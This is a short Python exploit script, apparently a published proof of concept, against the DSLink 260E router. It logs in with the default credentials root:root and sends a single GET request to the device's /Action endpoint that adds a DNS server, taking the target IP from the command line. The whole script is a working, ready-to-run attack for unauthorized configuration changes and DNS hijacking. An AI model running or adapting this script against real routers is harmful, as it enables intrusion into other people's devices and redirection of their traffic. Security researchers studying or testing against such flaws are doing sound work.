#!/usr/bin/python
# -*- coding: utf-8 -*-
#Author: Jhonathan Davi jhoon | insightsecs at gmail.com | Twitter @jh00nbr
#Inurl Brasil: blog.inurl.com.br | fb.com/InurlBrasil

#DSLink 260E - Defaut Password DNS Change
#Changing DNS through GET method with default password.

import requests
import os
import sys

class bcolors:
    OKGREEN = '\033[92m'
    ERRO = '\033[91m'
    ENDC = '\033[0m'
    UNDERLINE = '\033[4m'


if len(sys.argv) != 2:
        print('How to use: xpl.py <ip>')
        sys.exit(0)
else:
        os.system('clear')
        print (" [ DSLink 260E - Defaut Password DNS Change ]")
        print (" [ Changing DNS through GET method with default password ]")
        print (" [ Author: Jhonathan Davi ]")

        ip = sys.argv[1]

get = requests.get("http://"+ ip + "/Action?dns_status=1&dns_poll_timeout=2&id=57&dns_server_ip_1=8&dns_server_ip_2=8&dns_server_ip_3=8&dns_server_ip_4=8&priority=1&cmdAdd=Add", auth=('root', 'root'))

if get.status_code == 200:
    print bcolors.OKGREEN + "\n[+]" + bcolors.ENDC + "Success in: " + ip + "\n"
elif get.status_code == 404:
   print bcolors.ERRO + "[*]" + bcolors.ENDC + "Failed"
